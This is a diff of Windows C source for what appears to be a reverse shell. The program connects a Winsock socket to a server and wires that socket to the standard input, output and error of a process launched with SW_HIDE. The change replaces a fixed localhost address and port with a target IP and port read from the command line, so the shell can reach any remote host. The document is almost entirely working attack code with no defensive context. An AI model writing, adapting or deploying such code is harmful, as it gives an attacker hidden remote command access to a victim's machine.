@@ -6,7 +6,7 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-int main() {
+int main(int argc, char** argv) {
 
 	int iResult;
 	WSADATA wsaData;
@@ -46,12 +46,12 @@ int main() {
 	// IP address, and port of the server to be connected to.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
-	inet_pton(clientService.sin_family, "127.0.0.1", &clientService.sin_addr);
-	clientService.sin_port = htons(3000);
+	inet_pton(clientService.sin_family, argv[1], &clientService.sin_addr);
+	clientService.sin_port = htons(atoi(argv[2]));
 
 	//----------------------
 	// Connect to server.
-	
+
 	wsocket = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
 	if (wsocket == SOCKET_ERROR) {
 		wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
@@ -61,13 +61,13 @@ int main() {
 		WSACleanup();
 		return 1;
 	}
-	
+
 	//WSAConnect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService), NULL, NULL, NULL, NULL);
 
 	wprintf(L"Connected to server.\n");
 	memset(&si, 0, sizeof(si));
 	si.cb = sizeof(si);
-	si.dwFlags = STARTF_USESTDHANDLES|SW_HIDE;
+	si.dwFlags = STARTF_USESTDHANDLES | SW_HIDE;
 	si.hStdInput = (HANDLE)ConnectSocket;
 	si.hStdOutput = (HANDLE)ConnectSocket;
 	si.hStdError = (HANDLE)ConnectSocket;
